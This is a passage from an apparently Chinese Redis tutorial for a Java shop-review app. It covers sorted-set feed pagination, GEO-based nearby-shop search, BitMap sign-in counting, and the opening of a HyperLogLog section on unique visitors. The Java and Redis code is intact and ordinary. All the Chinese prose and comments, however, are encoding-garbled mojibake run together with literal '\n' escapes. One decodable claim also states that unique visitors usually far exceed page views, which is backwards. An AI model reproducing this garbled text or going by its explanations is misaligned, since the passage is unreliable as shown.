2ã€æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸ä¸Šä¸€æ¬¡æŸ¥è¯¢ç›¸åŒçš„æŸ¥è¯¢ä¸ªæ•°ä½œä¸ºåç§»é‡ï¼Œä¸‹æ¬¡æŸ¥è¯¢æ—¶ï¼Œè·³è¿‡è¿™äº›æŸ¥è¯¢è¿‡çš„æ•°æ®ï¼Œæ‹¿åˆ°æˆ‘ä»¬éœ€è¦çš„æ•°æ®\n\nç»¼ä¸Šï¼šæˆ‘ä»¬çš„è¯·æ±‚å‚æ•°ä¸­å°±éœ€è¦æºå¸¦ä¸¤ä¸ªå‚æ•°\n\n- lastIdï¼šä¸Šä¸€æ¬¡æŸ¥è¯¢çš„æœ€å°æ—¶é—´æˆ³\n- offsetï¼šåç§»é‡è¿™ä¸¤ä¸ªå‚æ•°ã€‚\n\nè¿™ä¸¤ä¸ªå‚æ•°ç¬¬ä¸€æ¬¡ä¼šç”±å‰ç«¯æ¥æŒ‡å®šï¼Œä»¥åçš„æŸ¥è¯¢å°±æ ¹æ®åå°ç»“æœä½œä¸ºæ¡ä»¶ï¼Œå†æ¬¡ä¼ é€’åˆ°åå°ã€‚\n\n![](https://img.jwt1399.top/img/202212021656095.png)\n\n- è¿”å›å€¼å®ä½“ç±»\n\n```java\n@Data\npublic class ScrollResult {\n    private List<?> list;\n    private Long minTime;\n    private Integer offset;\n}\n```\n\n- BlogController\n\n```java\n@GetMapping(\"/of/follow\")\npublic Result queryBlogOfFollow(\n    @RequestParam(\"lastId\") Long max, @RequestParam(value = \"offset\", defaultValue = \"0\") Integer offset){\n    return blogService.queryBlogOfFollow(max, offset);\n}\n```\n\n- BlogServiceImpl\n\n```java\n@Override\npublic Result queryBlogOfFollow(Long max, Integer offset) {\n    // 1.è·å–å½“å‰ç”¨æˆ·\n    Long userId = UserHolder.getUser().getId();\n    // 2.æŸ¥è¯¢æ”¶ä»¶ç®± ZREVRANGEBYSCORE key Max Min LIMIT offset count\n    String key = FEED_KEY + userId;\n    Set<ZSetOperations.TypedTuple<String>> typedTuples = stringRedisTemplate.opsForZSet()\n        .reverseRangeByScoreWithScores(key, 0, max, offset, 2);\n    // 3.éç©ºåˆ¤æ–­\n    if (typedTuples == null || typedTuples.isEmpty()) {\n        return Result.ok();\n    }\n    // 4.è§£ææ•°æ®ï¼šblogIdã€minTimeï¼ˆæ—¶é—´æˆ³ï¼‰ã€offset\n    List<Long> ids = new ArrayList<>(typedTuples.size());\n    long minTime = 0; // 2\n    int os = 1; // 2\n    for (ZSetOperations.TypedTuple<String> tuple : typedTuples) { // 5 4 4 2 2\n        // 4.1.è·å–id\n        ids.add(Long.valueOf(tuple.getValue()));\n        // 4.2.è·å–åˆ†æ•°(æ—¶é—´æˆ³ï¼‰\n        long time = tuple.getScore().longValue();\n        if(time == minTime){\n            os++;\n        }else{\n            minTime = time;\n            os = 1;\n        }\n    }\n\tos = minTime == max ? os : os + offset;\n    // 5.æ ¹æ®idæŸ¥è¯¢blog\n    String idStr = StrUtil.join(\",\", ids);\n    List<Blog> blogs = query().in(\"id\", ids).last(\"ORDER BY FIELD(id,\" + idStr + \")\").list();\n\n    for (Blog blog : blogs) {\n        // 5.1.æŸ¥è¯¢blogæœ‰å…³çš„ç”¨æˆ·\n        queryBlogUser(blog);\n        // 5.2.æŸ¥è¯¢blogæ˜¯å¦è¢«ç‚¹èµ\n        isBlogLiked(blog);\n    }\n\n    // 6.å°è£…å¹¶è¿”å›\n    ScrollResult r = new ScrollResult();\n    r.setList(blogs);\n    r.setOffset(os);\n    r.setMinTime(minTime);\n\n    return Result.ok(r);\n}\n```\n\n# â‘©é™„è¿‘çš„å•†æˆ·-GEO\n\n## â¶GEOæ•°æ®ç»“æ„çš„åŸºæœ¬ç”¨æ³•\n\nGEOå°±æ˜¯Geolocationçš„ç®€å†™å½¢å¼ï¼Œä»£è¡¨åœ°ç†åæ ‡ã€‚Redisåœ¨3.2ç‰ˆæœ¬ä¸­åŠ å…¥äº†å¯¹GEOçš„æ”¯æŒï¼Œå…è®¸å­˜å‚¨åœ°ç†åæ ‡ä¿¡æ¯ï¼Œå¸®åŠ©æˆ‘ä»¬æ ¹æ®ç»çº¬åº¦æ¥æ£€ç´¢æ•°æ®ã€‚å¸¸è§çš„å‘½ä»¤æœ‰ï¼š\n\n* GEOADDï¼šæ·»åŠ ä¸€ä¸ªåœ°ç†ç©ºé—´ä¿¡æ¯ï¼ŒåŒ…å«ï¼šç»åº¦ï¼ˆlongitudeï¼‰ã€çº¬åº¦ï¼ˆlatitudeï¼‰ã€å€¼ï¼ˆmemberï¼‰\n* GEODISTï¼šè®¡ç®—æŒ‡å®šçš„ä¸¤ä¸ªç‚¹ä¹‹é—´çš„è·ç¦»å¹¶è¿”å›\n* GEOHASHï¼šå°†æŒ‡å®šmemberçš„åæ ‡è½¬ä¸ºhashå­—ç¬¦ä¸²å½¢å¼å¹¶è¿”å›\n* GEOPOSï¼šè¿”å›æŒ‡å®šmemberçš„åæ ‡\n* ~~GEORADIUSï¼šæŒ‡å®šåœ†å¿ƒã€åŠå¾„ï¼Œæ‰¾åˆ°è¯¥åœ†å†…åŒ…å«çš„æ‰€æœ‰memberï¼Œå¹¶æŒ‰ç…§ä¸åœ†å¿ƒä¹‹é—´çš„è·ç¦»æ’åºåè¿”å›ã€‚6.ä»¥åå·²åºŸå¼ƒ~~\n* GEOSEARCHï¼šåœ¨æŒ‡å®šèŒƒå›´å†…æœç´¢memberï¼Œå¹¶æŒ‰ç…§ä¸æŒ‡å®šç‚¹ä¹‹é—´çš„è·ç¦»æ’åºåè¿”å›ã€‚èŒƒå›´å¯ä»¥æ˜¯åœ†å½¢æˆ–çŸ©å½¢ã€‚6.2.æ–°åŠŸèƒ½\n* GEOSEARCHSTOREï¼šä¸GEOSEARCHåŠŸèƒ½ä¸€è‡´ï¼Œä¸è¿‡å¯ä»¥æŠŠç»“æœå­˜å‚¨åˆ°ä¸€ä¸ªæŒ‡å®šçš„keyã€‚ 6.2.æ–°åŠŸèƒ½\n\n> ç»ƒä¹ Redisçš„GEOåŠŸèƒ½\n>\n> - 1.æ·»åŠ ä¸‹é¢å‡ æ¡æ•°æ®ï¼š\n>\n>   - åŒ—äº¬å—ç«™ï¼ˆ 116.378248 39.865275 ï¼‰\n>\n>   - åŒ—äº¬ç«™ï¼ˆ 116.42803 39.903738 ï¼‰\n>\n>   - åŒ—äº¬è¥¿ç«™ï¼ˆ 116.322287 39.893729 ï¼‰\n>\n> ```sql\n> 127.0.0.1:6379> GEOADd gkey 116.378248 39.865275 bjn 116.42803 39.903738 bj 116.322287 39.893729 bjx\n> (integer) 3\n> ```\n>\n> - 2.è®¡ç®—åŒ—äº¬è¥¿ç«™åˆ°åŒ—äº¬ç«™çš„è·ç¦»\n>\n> ```sql\n> 127.0.0.1:6379> GEODIST gkey bjx bj km\n> \"9.0916\"\n> ```\n>\n> - 3.æœç´¢å¤©å®‰é—¨ï¼ˆ 116.397904 39.909005 ï¼‰é™„è¿‘10kmå†…çš„æ‰€æœ‰ç«è½¦ç«™ï¼Œå¹¶æŒ‰ç…§è·ç¦»å‡åºæ’åº\n>\n> ```sql\n> 127.0.0.1:6379> GEOSEARCH gkey FROMLONLAT 116.397904 39.909005 BYRADIUS 10 km\n> 1) \"bj\"\n> 2) \"bjn\"\n> 3) \"bjx\"\n> ```\n\n## â·å¯¼å…¥åº—é“ºæ•°æ®åˆ°GEO\n\nå½“æˆ‘ä»¬ç‚¹å‡»ç¾é£Ÿä¹‹åï¼Œä¼šå‡ºç°ä¸€ç³»åˆ—çš„å•†å®¶ï¼Œå•†å®¶ä¸­å¯ä»¥æŒ‰ç…§å¤šç§æ’åºæ–¹å¼ï¼Œæˆ‘ä»¬æ­¤æ—¶å…³æ³¨çš„æ˜¯è·ç¦»ï¼Œè¿™ä¸ªåœ°æ–¹å°±éœ€è¦ä½¿ç”¨åˆ°æˆ‘ä»¬çš„GEOï¼Œå‘åå°ä¼ å…¥å½“å‰appæ”¶é›†çš„åœ°å€(æˆ‘ä»¬æ­¤å¤„æ˜¯å†™æ­»çš„) ï¼Œä»¥å½“å‰åæ ‡ä½œä¸ºåœ†å¿ƒï¼ŒåŒæ—¶ç»‘å®šç›¸åŒçš„åº—å®¶ç±»å‹typeï¼Œä»¥åŠåˆ†é¡µä¿¡æ¯ï¼ŒæŠŠè¿™å‡ ä¸ªæ¡ä»¶ä¼ å…¥åå°ï¼Œåå°æŸ¥è¯¢å‡ºå¯¹åº”çš„æ•°æ®å†è¿”å›ã€‚\n\n![](https://img.jwt1399.top/img/202212031520795.png)\n\næˆ‘ä»¬è¦åšçš„äº‹æƒ…æ˜¯ï¼šå°†æ•°æ®åº“è¡¨ä¸­çš„æ•°æ®å¯¼å…¥åˆ°redisä¸­å»ï¼Œredisä¸­çš„GEOï¼ŒGEOåœ¨redisä¸­æ˜¯ä¸€ä¸ªmenberå’Œä¸€ä¸ªç»çº¬åº¦ï¼Œæˆ‘ä»¬æŠŠxå’Œyä¼ å…¥åˆ°ç»çº¬åº¦ä½ç½®å»ï¼Œä½†æˆ‘ä»¬ä¸èƒ½æŠŠæ‰€æœ‰çš„æ•°æ®éƒ½æ”¾å…¥åˆ°menberä¸­å»ï¼Œæ¯•ç«Ÿä½œä¸ºredisæ˜¯ä¸€ä¸ªå†…å­˜çº§æ•°æ®åº“ï¼Œå¦‚æœå­˜æµ·é‡æ•°æ®ï¼Œredisè¿˜æ˜¯åŠ›ä¸ä»å¿ƒï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è¿™ä¸ªåœ°æ–¹å­˜å‚¨ä»–çš„idå³å¯ã€‚\n\nä½†æ˜¯è¿™ä¸ªæ—¶å€™è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯åœ¨redisä¸­å¹¶æ²¡æœ‰å­˜å‚¨typeï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•æ ¹æ®typeæ¥å¯¹æ•°æ®è¿›è¡Œç­›é€‰ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŒ‰ç…§å•†æˆ·ç±»å‹åšåˆ†ç»„ï¼Œç±»å‹ç›¸åŒçš„å•†æˆ·ä½œä¸ºåŒä¸€ç»„ï¼Œä»¥typeIdä¸ºkeyå­˜å…¥åŒä¸€ä¸ªGEOé›†åˆä¸­å³å¯\n\n![](../images/Redis-å®æˆ˜ç¯‡/image-20221203152526081.png)\n\nHmDianPingApplicationTests\n\n```java\n@Test\nvoid loadShopData() {\n    // 1.æŸ¥è¯¢åº—é“ºä¿¡æ¯\n    List<Shop> list = shopService.list();\n    // 2.æŠŠåº—é“ºåˆ†ç»„ï¼ŒæŒ‰ç…§typeIdåˆ†ç»„ï¼ŒtypeIdä¸€è‡´çš„æ”¾åˆ°ä¸€ä¸ªé›†åˆ\n    Map<Long, List<Shop>> map = list.stream().collect(Collectors.groupingBy(Shop::getTypeId));\n    // 3.åˆ†æ‰¹å®Œæˆå†™å…¥Redis\n    for (Map.Entry<Long, List<Shop>> entry : map.entrySet()) {\n        // 3.1.è·å–ç±»å‹id\n        Long typeId = entry.getKey();\n        String key = SHOP_GEO_KEY + typeId;\n        // 3.2.è·å–åŒç±»å‹çš„åº—é“ºçš„é›†åˆ\n        List<Shop> value = entry.getValue();\n        List<RedisGeoCommands.GeoLocation<String>> locations = new ArrayList<>(value.size());\n        // 3.3.å†™å…¥redis GEOADD key ç»åº¦ çº¬åº¦ member\n        for (Shop shop : value) {\n            // stringRedisTemplate.opsForGeo().add(key, new Point(shop.getX(), shop.getY()), shop.getId().toString());\n            locations.add(new RedisGeoCommands.GeoLocation<>(\n                    shop.getId().toString(),\n                    new Point(shop.getX(), shop.getY())\n            ));\n        }\n        stringRedisTemplate.opsForGeo().add(key, locations);\n    }\n}\n```\n\n## â¸å®ç°é™„è¿‘å•†æˆ·åŠŸèƒ½\n\nSpringDataRedisçš„2.3.9ç‰ˆæœ¬å¹¶ä¸æ”¯æŒRedis 6.2æä¾›çš„GEOSEARCHå‘½ä»¤ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æå‡å…¶ç‰ˆæœ¬ï¼Œä¿®æ”¹è‡ªå·±çš„POM\n\nç¬¬ä¸€æ­¥ï¼šå¯¼å…¥pom\n\n```xml\n<!--æ’é™¤é»˜è®¤çš„-->\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-data-redis</artifactId>\n    <exclusions>\n        <exclusion>\n            <artifactId>spring-data-redis</artifactId>\n            <groupId>org.springframework.data</groupId>\n        </exclusion>\n        <exclusion>\n            <artifactId>lettuce-core</artifactId>\n            <groupId>io.lettuce</groupId>\n        </exclusion>\n    </exclusions>\n</dependency>\n<!--æ·»åŠ è‡ªå·±çš„-->\n<dependency>\n    <groupId>org.springframework.data</groupId>\n    <artifactId>spring-data-redis</artifactId>\n    <version>2.6.2</version>\n</dependency>\n<dependency>\n    <groupId>io.lettuce</groupId>\n    <artifactId>lettuce-core</artifactId>\n    <version>6.1.6.RELEASE</version>\n</dependency>\n```\n\nç¬¬äºŒæ­¥ï¼š\n\nShopController\n\n```java\n@GetMapping(\"/of/type\")\npublic Result queryShopByType(\n        @RequestParam(\"typeId\") Integer typeId,\n        @RequestParam(value = \"current\", defaultValue = \"1\") Integer current,\n        @RequestParam(value = \"x\", required = false) Double x,\n        @RequestParam(value = \"y\", required = false) Double y\n) {\n   return shopService.queryShopByType(typeId, current, x, y);\n}\n```\n\nShopServiceImpl\n\n```java\n\t\t@Override\n    public Result queryShopByType(Integer typeId, Integer current, Double x, Double y) {\n        // 1.åˆ¤æ–­æ˜¯å¦éœ€è¦æ ¹æ®åæ ‡æŸ¥è¯¢\n        if (x == null || y == null) {\n            // ä¸éœ€è¦åæ ‡æŸ¥è¯¢ï¼ŒæŒ‰æ•°æ®åº“æŸ¥è¯¢\n            Page<Shop> page = query()\n                    .eq(\"type_id\", typeId)\n                    .page(new Page<>(current, SystemConstants.DEFAULT_PAGE_SIZE));\n            // è¿”å›æ•°æ®\n            return Result.ok(page.getRecords());\n        }\n\n        // 2.è®¡ç®—åˆ†é¡µå‚æ•°\n        int from = (current - 1) * SystemConstants.DEFAULT_PAGE_SIZE;\n        int end = current * SystemConstants.DEFAULT_PAGE_SIZE;\n\n        // 3.æŸ¥è¯¢redisã€æŒ‰ç…§è·ç¦»æ’åºã€åˆ†é¡µã€‚ç»“æœï¼šshopIdã€distance\n        String key = SHOP_GEO_KEY + typeId;\n        GeoResults<RedisGeoCommands.GeoLocation<String>> results = stringRedisTemplate.opsForGeo() // GEOSEARCH key BYLONLAT x y BYRADIUS 10 WITHDISTANCE\n                .search(\n                        key,\n                        GeoReference.fromCoordinate(x, y),\n                        new Distance(5000),\n                        RedisGeoCommands.GeoSearchCommandArgs.newGeoSearchArgs().includeDistance().limit(end)\n                );\n        // 4.è§£æå‡ºid\n        if (results == null) {\n            return Result.ok(Collections.emptyList());\n        }\n        List<GeoResult<RedisGeoCommands.GeoLocation<String>>> list = results.getContent();\n        if (list.size() <= from) {\n            // æ²¡æœ‰ä¸‹ä¸€é¡µäº†ï¼Œç»“æŸ\n            return Result.ok(Collections.emptyList());\n        }\n        // 4.1.æˆªå– from ~ endçš„éƒ¨åˆ†\n        List<Long> ids = new ArrayList<>(list.size());\n        Map<String, Distance> distanceMap = new HashMap<>(list.size());\n        list.stream().skip(from).forEach(result -> {\n            // 4.2.è·å–åº—é“ºid\n            String shopIdStr = result.getContent().getName();\n            ids.add(Long.valueOf(shopIdStr));\n            // 4.3.è·å–è·ç¦»\n            Distance distance = result.getDistance();\n            distanceMap.put(shopIdStr, distance);\n        });\n        // 5.æ ¹æ®idæŸ¥è¯¢Shop\n        String idStr = StrUtil.join(\",\", ids);\n        List<Shop> shops = query().in(\"id\", ids).last(\"ORDER BY FIELD(id,\" + idStr + \")\").list();\n        for (Shop shop : shops) {\n            shop.setDistance(distanceMap.get(shop.getId().toString()).getValue());\n        }\n        // 6.è¿”å›\n        return Result.ok(shops);\n    }\n```\n\n# â‘ªç”¨æˆ·ç­¾åˆ°-BitMap\n\n## â¶æ€è·¯\n\né’ˆå¯¹ç­¾åˆ°åŠŸèƒ½å®Œå…¨å¯ä»¥é€šè¿‡MySQLæ¥å®Œæˆï¼Œç”¨æˆ·ä¸€æ¬¡ç­¾åˆ°ï¼Œå°±æ˜¯ä¸€æ¡è®°å½•ï¼Œå‡å¦‚æœ‰1000ä¸‡ç”¨æˆ·ï¼Œå¹³å‡æ¯äººæ¯å¹´ç­¾åˆ°æ¬¡æ•°ä¸º10æ¬¡ï¼Œåˆ™è¿™å¼ è¡¨ä¸€å¹´çš„æ•°æ®é‡ä¸º1äº¿æ¡ï¼Œå‡è®¾æ¯æ¬¡ç­¾åˆ°éœ€è¦ä½¿ç”¨20å­—èŠ‚çš„å†…å­˜ï¼Œä¸€ä¸ªæœˆåˆ™éœ€è¦600å¤šå­—èŠ‚ã€‚\n\næˆ‘ä»¬å¦‚ä½•èƒ½å¤Ÿç®€åŒ–ä¸€ç‚¹å‘¢ï¼Ÿé‡‡ç”¨Redisçš„BitMap\n\næˆ‘ä»¬æŒ‰æœˆæ¥ç»Ÿè®¡ç”¨æˆ·ç­¾åˆ°ä¿¡æ¯ï¼ŒæŠŠæ¯ä¸€ä¸ªbitä½å¯¹åº”å½“æœˆçš„æ¯ä¸€å¤©ï¼Œå½¢æˆäº†æ˜ å°„å…³ç³»ã€‚ç”¨0å’Œ1æ ‡ç¤ºä¸šåŠ¡çŠ¶æ€ï¼Œç­¾åˆ°è®°å½•ä¸º1ï¼Œæœªç­¾åˆ°åˆ™è®°å½•ä¸º0ã€‚è¿™æ ·æˆ‘ä»¬å°±ç”¨æå°çš„ç©ºé—´ï¼Œæ¥å®ç°äº†å¤§é‡æ•°æ®çš„è¡¨ç¤ºã€‚\n\nRedisä¸­æ˜¯åˆ©ç”¨stringç±»å‹æ•°æ®ç»“æ„å®ç°BitMapï¼Œå› æ­¤æœ€å¤§ä¸Šé™æ˜¯512Mï¼Œè½¬æ¢ä¸ºbitåˆ™æ˜¯ 2^32ä¸ªbitä½ã€‚\n\n![](https://img.jwt1399.top/img/202212041337440.png)\n\nBitMapçš„æ“ä½œå‘½ä»¤æœ‰ï¼š\n\n* SETBITï¼šå‘æŒ‡å®šä½ç½®ï¼ˆoffsetï¼‰å­˜å…¥ä¸€ä¸ª0æˆ–1\n* GETBIT ï¼šè·å–æŒ‡å®šä½ç½®ï¼ˆoffsetï¼‰çš„bitå€¼\n* BITCOUNT ï¼šç»Ÿè®¡BitMapä¸­å€¼ä¸º1çš„bitä½çš„æ•°é‡\n* BITFIELD ï¼šæ“ä½œï¼ˆæŸ¥è¯¢ã€ä¿®æ”¹ã€è‡ªå¢ï¼‰BitMapä¸­bitæ•°ç»„ä¸­çš„æŒ‡å®šä½ç½®ï¼ˆoffsetï¼‰çš„å€¼\n  * u ä»£è¡¨æ— ç¬¦å·ä½ï¼Œi ä»£è¡¨æœ‰ç¬¦å·ä½\n* BITFIELD_RO ï¼šè·å–BitMapä¸­bitæ•°ç»„ï¼Œå¹¶ä»¥åè¿›åˆ¶å½¢å¼è¿”å›\n* BITOP ï¼šå°†å¤šä¸ªBitMapçš„ç»“æœåšä½è¿ç®—ï¼ˆä¸ ã€æˆ–ã€å¼‚æˆ–ï¼‰\n* BITPOS ï¼šæŸ¥æ‰¾bitæ•°ç»„ä¸­æŒ‡å®šèŒƒå›´å†…ç¬¬ä¸€ä¸ª0æˆ–1å‡ºç°çš„ä½ç½®\n\n## â·å®ç°ç­¾åˆ°åŠŸèƒ½\n\n> éœ€æ±‚ï¼šå®ç°ç­¾åˆ°æ¥å£ï¼Œå°†å½“å‰ç”¨æˆ·å½“å¤©ç­¾åˆ°ä¿¡æ¯ä¿å­˜åˆ°Redisä¸­\n\n- UserController\n\n```java\n@PostMapping(\"/sign\")\npublic Result sign(){\n  return userService.sign();\n}\n```\n\n- UserServiceImpl\n\n```java\n@Override\npublic Result sign() {\n    // 1.è·å–å½“å‰ç™»å½•ç”¨æˆ·\n    Long userId = UserHolder.getUser().getId();\n    // 2.è·å–æ—¥æœŸ\n    LocalDateTime now = LocalDateTime.now();\n    // 3.æ‹¼æ¥key\n    String keySuffix = now.format(DateTimeFormatter.ofPattern(\":yyyyMM\"));\n    String key = USER_SIGN_KEY + userId + keySuffix;\n    // 4.è·å–ä»Šå¤©æ˜¯æœ¬æœˆçš„ç¬¬å‡ å¤©\n    int dayOfMonth = now.getDayOfMonth();\n    // 5.å†™å…¥Redis SETBIT key offset 1\n    stringRedisTemplate.opsForValue().setBit(key, dayOfMonth - 1, true);\n    return Result.ok();\n}\n```\n\n## â¸ç­¾åˆ°ç»Ÿè®¡\n\n**é—®é¢˜1ï¼š**ä»€ä¹ˆå«åšè¿ç»­ç­¾åˆ°å¤©æ•°ï¼Ÿ\n\nä»æœ€åä¸€æ¬¡ç­¾åˆ°å¼€å§‹å‘å‰ç»Ÿè®¡ï¼Œç›´åˆ°é‡åˆ°ç¬¬ä¸€æ¬¡æœªç­¾åˆ°ä¸ºæ­¢ï¼Œè®¡ç®—æ€»çš„ç­¾åˆ°æ¬¡æ•°ï¼Œå°±æ˜¯è¿ç»­ç­¾åˆ°å¤©æ•°ã€‚\n\nJavaé€»è¾‘ä»£ç ï¼šè·å¾—å½“å‰è¿™ä¸ªæœˆçš„æœ€åä¸€æ¬¡ç­¾åˆ°æ•°æ®ï¼Œå®šä¹‰ä¸€ä¸ªè®¡æ•°å™¨ï¼Œç„¶åä¸åœçš„å‘å‰ç»Ÿè®¡ï¼Œç›´åˆ°è·å¾—ç¬¬ä¸€ä¸ªé1çš„æ•°å­—å³å¯ï¼Œæ¯å¾—åˆ°ä¸€ä¸ªé0çš„æ•°å­—è®¡æ•°å™¨+1ï¼Œç›´åˆ°éå†å®Œæ‰€æœ‰çš„æ•°æ®ï¼Œå°±å¯ä»¥è·å¾—è¿ç»­ç­¾åˆ°å¤©æ•°äº†\n\n**é—®é¢˜2ï¼š**å¦‚ä½•å¾—åˆ°æœ¬æœˆåˆ°ä»Šå¤©ä¸ºæ­¢çš„æ‰€æœ‰ç­¾åˆ°æ•°æ®ï¼Ÿ\n\n```sql\nBITFIELD key GET u[dayOfMonth] 0\n\n# u[dayOfMonth] è·å–dayOfMonthä¸ªbitä½\n# è¿”å›ç»“æœä¸º10è¿›åˆ¶\n```\n\nå‡è®¾ä»Šå¤©æ˜¯10å·ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä»å½“å‰æœˆçš„ç¬¬ä¸€å¤©å¼€å§‹ï¼Œè·å¾—åˆ°å½“å‰è¿™ä¸€å¤©çš„ä½æ•°ï¼Œæ˜¯10å·ï¼Œé‚£ä¹ˆå°±æ˜¯10ä½ï¼Œå»æ‹¿è¿™æ®µæ—¶é—´çš„æ•°æ®ï¼Œå°±èƒ½æ‹¿åˆ°æ‰€æœ‰çš„æ•°æ®äº†ï¼Œé‚£ä¹ˆè¿™10å¤©é‡Œè¾¹ç­¾åˆ°äº†å¤šå°‘æ¬¡å‘¢ï¼Ÿç»Ÿè®¡æœ‰å¤šå°‘ä¸ª1å³å¯ã€‚\n\n**é—®é¢˜3ï¼šå¦‚ä½•ä»åå‘å‰éå†æ¯ä¸ªbitä½ï¼Ÿ**\n\næ³¨æ„ï¼šBITFIELDè¿”å›çš„æ•°æ®æ˜¯10è¿›åˆ¶ï¼Œå‡å¦‚è¯´è¿”å›ä¸€ä¸ªæ•°å­—8ï¼Œé‚£ä¹ˆæˆ‘å“ªå„¿çŸ¥é“åˆ°åº•å“ªäº›æ˜¯0ï¼Œå“ªäº›æ˜¯1å‘¢ï¼Ÿæˆ‘ä»¬åªéœ€è¦è®©å¾—åˆ°çš„10è¿›åˆ¶æ•°å­—å’Œ1åšä¸è¿ç®—å°±å¯ä»¥äº†ï¼Œå› ä¸º1åªæœ‰é‡è§1 æ‰æ˜¯1ï¼Œå…¶ä»–æ•°å­—éƒ½æ˜¯0 ï¼Œæˆ‘ä»¬æŠŠç­¾åˆ°ç»“æœå’Œ1è¿›è¡Œä¸æ“ä½œï¼Œæ¯ä¸ä¸€æ¬¡ï¼Œå°±æŠŠç­¾åˆ°ç»“æœå‘å³ç§»åŠ¨ä¸€ä½ï¼Œä¾æ¬¡å†…æ¨ï¼Œæˆ‘ä»¬å°±èƒ½å®Œæˆé€ä¸ªéå†çš„æ•ˆæœäº†ã€‚\n\n> éœ€æ±‚ï¼šå®ç°æ¥å£ï¼Œç»Ÿè®¡å½“å‰ç”¨æˆ·æˆªæ­¢å½“å‰æ—¶é—´åœ¨æœ¬æœˆçš„è¿ç»­ç­¾åˆ°å¤©æ•°\n\n- **UserController**\n\n```java\n@GetMapping(\"/sign/count\")\npublic Result signCount(){\n    return userService.signCount();\n}\n```\n\n- **UserServiceImpl**\n\n```java\n@Override\npublic Result signCount() {\n    // 1.è·å–å½“å‰ç™»å½•ç”¨æˆ·\n    Long userId = UserHolder.getUser().getId();\n    // 2.è·å–æ—¥æœŸ\n    LocalDateTime now = LocalDateTime.now();\n    // 3.æ‹¼æ¥key\n    String keySuffix = now.format(DateTimeFormatter.ofPattern(\":yyyyMM\"));\n    String key = USER_SIGN_KEY + userId + keySuffix;\n    // 4.è·å–ä»Šå¤©æ˜¯æœ¬æœˆçš„ç¬¬å‡ å¤©\n    int dayOfMonth = now.getDayOfMonth();\n   // 5.è·å–æœ¬æœˆæˆªæ­¢ä»Šå¤©ä¸ºæ­¢çš„æ‰€æœ‰çš„ç­¾åˆ°è®°å½•ï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ªåè¿›åˆ¶çš„æ•°å­— BITFIELD sign:5:202203 GET u14 0\n    List<Long> result = stringRedisTemplate.opsForValue().bitField(\n            key,\n            BitFieldSubCommands.create()\n                    .get(BitFieldSubCommands.BitFieldType.unsigned(dayOfMonth)).valueAt(0)\n    );\n    if (result == null || result.isEmpty()) {\n        // æ²¡æœ‰ä»»ä½•ç­¾åˆ°ç»“æœ\n        return Result.ok(0);\n    }\n    Long num = result.get(0);\n    if (num == null || num == 0) {\n        return Result.ok(0);\n    }\n    // 6.å¾ªç¯éå†\n    int count = 0;\n    while (true) {\n        // 6.1.è®©è¿™ä¸ªæ•°å­—ä¸1åšä¸è¿ç®—ï¼Œå¾—åˆ°æ•°å­—çš„æœ€åä¸€ä¸ªbitä½  // åˆ¤æ–­è¿™ä¸ªbitä½æ˜¯å¦ä¸º0\n        if ((num & 1) == 0) {\n            // å¦‚æœä¸º0ï¼Œè¯´æ˜æœªç­¾åˆ°ï¼Œç»“æŸ\n            break;\n        }else {\n            // å¦‚æœä¸ä¸º0ï¼Œè¯´æ˜å·²ç­¾åˆ°ï¼Œè®¡æ•°å™¨+1\n            count++;\n        }\n        // æŠŠæ•°å­—å³ç§»ä¸€ä½ï¼ŒæŠ›å¼ƒæœ€åä¸€ä¸ªbitä½ï¼Œç»§ç»­ä¸‹ä¸€ä¸ªbitä½\n        num >>>= 1;\n    }\n    return Result.ok(count);\n}\n```\n\n# â‘«UVç»Ÿè®¡-HyperLogLog\n\né¦–å…ˆæˆ‘ä»¬ææ‡‚ä¸¤ä¸ªæ¦‚å¿µï¼š\n\n* UVï¼šå…¨ç§°Unique Visitorï¼Œä¹Ÿå«ç‹¬ç«‹è®¿å®¢é‡ï¼Œæ˜¯æŒ‡é€šè¿‡äº’è”ç½‘è®¿é—®ã€æµè§ˆè¿™ä¸ªç½‘é¡µçš„è‡ªç„¶äººã€‚1å¤©å†…åŒä¸€ä¸ªç”¨æˆ·å¤šæ¬¡è®¿é—®è¯¥ç½‘ç«™ï¼Œåªè®°å½•1æ¬¡ã€‚\n* PVï¼šå…¨ç§°Page Viewï¼Œä¹Ÿå«é¡µé¢è®¿é—®é‡æˆ–ç‚¹å‡»é‡ï¼Œç”¨æˆ·æ¯è®¿é—®ç½‘ç«™çš„ä¸€ä¸ªé¡µé¢ï¼Œè®°å½•1æ¬¡PVï¼Œç”¨æˆ·å¤šæ¬¡æ‰“å¼€é¡µé¢ï¼Œåˆ™è®°å½•å¤šæ¬¡PVã€‚å¾€å¾€ç”¨æ¥è¡¡é‡ç½‘ç«™çš„æµé‡ã€‚\n\né€šå¸¸æ¥è¯´UVä¼šæ¯”PVå¤§å¾ˆå¤šï¼Œæ‰€ä»¥è¡¡é‡åŒä¸€ä¸ªç½‘ç«™çš„è®¿é—®é‡ï¼Œæˆ‘ä»¬éœ€è¦ç»¼åˆè€ƒè™‘å¾ˆå¤šå› ç´ ï¼Œæ‰€ä»¥æˆ‘ä»¬åªæ˜¯å•çº¯çš„æŠŠè¿™ä¸¤ä¸ªå€¼ä½œä¸ºä¸€ä¸ªå‚è€ƒå€¼\n\nUVç»Ÿè®¡åœ¨æœåŠ¡ç«¯åšä¼šæ¯”è¾ƒéº»çƒ¦ï¼Œå› ä¸ºè¦åˆ¤æ–­è¯¥ç”¨æˆ·æ˜¯å¦å·²ç»ç»Ÿè®¡è¿‡äº†ï¼Œéœ€è¦å°†ç»Ÿè®¡è¿‡çš„ç”¨æˆ·ä¿¡æ¯ä¿å­˜ã€‚ä½†æ˜¯å¦‚æœæ¯ä¸ªè®¿é—®çš„ç”¨æˆ·éƒ½ä¿å­˜åˆ°Redisä¸­ï¼Œæ•°æ®é‡ä¼šéå¸¸ææ€–ï¼Œé‚£æ€ä¹ˆå¤„ç†å‘¢ï¼Ÿ\n\nHyperloglog(HLL) 